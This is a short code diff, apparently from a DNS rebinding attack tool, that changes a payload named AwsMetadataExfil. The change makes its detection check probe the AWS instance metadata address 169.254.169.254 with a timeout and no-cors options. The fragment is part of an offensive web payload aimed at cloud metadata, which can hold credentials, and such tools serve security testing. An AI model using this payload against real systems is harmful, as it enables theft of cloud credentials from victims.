@@ -42,7 +42,13 @@ const AwsMetadataExfil = () => {
     // Invoked to determine to detect whether the rebinded service
     // is the one targetted by this payload. Must return true or false.
     async function isService(headers, cookie, body) {
-        return fetch("http://169.254.169.254/latest/meta-data/")
+        let controller = new AbortController(); //NO IE support
+        let signal = controller.signal;
+        return timeout(1000, fetch(`http://169.254.169.254/latest/meta-data/`, {
+            mode: 'no-cors',
+            credentials: 'omit',
+            signal
+        }), controller)
             .then(response => {
                 return true;
             })
